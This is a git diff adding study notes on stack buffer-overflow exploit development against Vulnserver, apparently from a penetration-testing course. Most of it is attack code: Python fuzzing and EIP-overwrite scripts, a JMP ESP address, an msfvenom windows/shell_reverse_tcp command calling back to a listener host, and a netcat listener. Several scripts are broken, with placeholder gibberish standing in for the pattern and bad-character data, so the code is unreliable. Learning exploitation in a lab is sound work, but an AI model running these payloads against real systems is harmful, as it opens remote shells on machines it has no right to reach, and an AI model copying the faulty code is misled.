@@ -814,17 +814,270 @@ eg: windows/meterpreter_reverse_tcp  | windows/meterpreter/reverse_tcp
 * Netmon (25:49)
 
 ## Introduction to Exploit Development (Buffer Overflows)
+ 
+### Required Installations
+
+* Immunity Debugger: https://www.immunityinc.com/products/debugger/
+
+* Vulnserver: http://www.thegreycorner.com/p/vulnserver.html
+
+
+## Buffer Overflows Explained
+
+**Anatomy of Memory**
+
+Top | Kernael | 11111
+    | stack |
+    | Heap | 
+    | Data | 
+Bottom | Text | 00000
+
+**Anatomy of Stack**
+
+ESP (Extended Stack Potnter) | TOP
+
+Buffer Space
+
+EBP (Exyended Base Poninter) | BOTTOM 
+
+EIP (Extended Instruction Pointer) / Return Address
 
 
 
+**steps to  conduct a buffer overflow**
+
+* 1. Spiking
+* 2. Fuzzing 
+* 3. Finding the Offset
+* 4. Overwriting The EIP
+* 5. Finding bad character
+* 6. Finding the Right Module
+* 7. Generating Shellcode
+* 8. Root!
 
 
+### Spiking
 
 
+* connect to vulnserver from kali 
+
+* ```nc -nv 192.168.1.90 9999 ```
+
+* ```generic_send_tcp 192.168.1.90 9999 stacks.spk 0 0```
+
+  * stacks.spk
+  
+  ```
+  s_readLine[];
+  s_string["STATS "];
+  s_string_variable["0"];
+  ```
+  
+  * tran.spk
+  
+  ```
+  s_readLine[];
+  s_string["TRAN "];
+  s_string_variable["0"];
+  ```
+
+### FUZZING
+
+**1.py**
+
+```python3
+#!/usr/bin/python
+ 
+import sys, socket
+from time import sleep
+ 
+buffer = "A" * 100
+ 
+while True:
+    try:
+        payload = "TRUN /.:/" + buffer
+ 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.1.35',9999))
+        print ("[+] Sending the payload...\n" + str(len(buffer)))
+        s.send((payload.encode()))
+        s.close()
+        sleep(1)
+        buffer = buffer + "A"*100
+    except:
+        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
+        sys.exit()
+ ```
+ 
+* running the script 
 
 
+### Finding the Offset
+
+**pattern_create**
+
+```pattern_create.rb -l 3000 ```
 
 
+**2.py**
+
+
+```python3
+#!/usr/bin/python
+ 
+import sys, socket
+
+offset = afasdfghjklxcvbnmhdwertyukojahayufavhjhagsiyftyuef
+while True:
+    try:
+        payload = "TRUN /.:/" + offset
+ 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.1.35',9999))
+        print ("[+] Sending the payload...\n" + str(len(offset)))
+        s.send((payload.encode()))
+        s.close()
+        
+    except:
+        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
+        sys.exit()
+ ```
+
+* run the script
+
+
+**pattern_offset**
+
+```pattern_offset.rb -l 3000 -q 386F4337 ```
+
+### Overwriting the EIP
+
+
+```python3
+#!/usr/bin/python
+ 
+import sys, socket
+
+shellcode= "A" * 2003 + "B" * 4 
+while True:
+    try:
+        payload = "TRUN /.:/" + shellcode
+ 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.1.35',9999))
+        print ("[+] Sending the payload...\n" + str(len(shellcode)))
+        s.send((payload.encode()))
+        s.close()
+        
+    except:
+        print ("The fuzzing crashed at %s bytes" % str(len(shellcode)))
+        sys.exit()
+ ```
+
+### Finding Bad Characters 
+
+* for generating the shell code
+
+* look for badchars in google
+
+* 
+```python3
+#!/usr/bin/python
+ 
+import sys, socket
+
+badchars= ["asaf3af"]
+
+shellcode= "A" * 2003 + "B" * 4 + badchars
+while True:
+    try:
+        payload = "TRUN /.:/" + shellcode
+ 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.1.35',9999))
+        print ("[+] Sending the payload...\n" + str(len(shellcode)))
+        s.send((payload.encode()))
+        s.close()
+        
+    except:
+        print ("The fuzzing crashed at %s bytes" % str(len(shellcode)))
+        sys.exit()
+ ```
+
+
+### Finding the Right Module
+
+* look for module in google and get the mona.py
+
+* ```locate nasm_shell ```
+
+* nasm_shell
+
+```nasm_shell.rb 
+nasm > JMP ESP
+0000000 FFE4
+```
+
+* 
+```python3
+#!/usr/bin/python
+ 
+import sys, socket
+
+#625011af
+
+shellcode= "A" * 2003 + "\xaf\x11\x50\x62"
+    try:
+        payload = "TRUN /.:/" + shellcode
+ 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.1.35',9999))
+        print ("[+] Sending the payload...\n" + str(len(shellcode)))
+        s.send((payload.encode()))
+        s.close()
+        
+    except:
+        print ("The fuzzing crashed at %s bytes" % str(len(shellcode)))
+        sys.exit()
+ ```
+
+* execute the script
+
+
+### Generating Shellcode and Gaining Root
+
+* generate the shell code
+
+```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.131 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" ```
+
+  * copy the code
+  
+*
+```python3
+#!/usr/bin/python
+ 
+import sys, socket
+
+overflow = [""]
+
+shellcode= "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
+    try:
+        payload = "TRUN /.:/" + shellcode
+ 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.1.35',9999))
+        print ("[+] Sending the payload...\n" + str(len(shellcode)))
+        s.send((payload.encode()))
+        s.close()
+        
+    except:
+        print ("The fuzzing crashed at %s bytes" % str(len(shellcode)))
+        sys.exit()
+ ```
+
+* create a netcat lsitner ```nc -nlvp 4444 ```
+
+* run the script
 
 
 
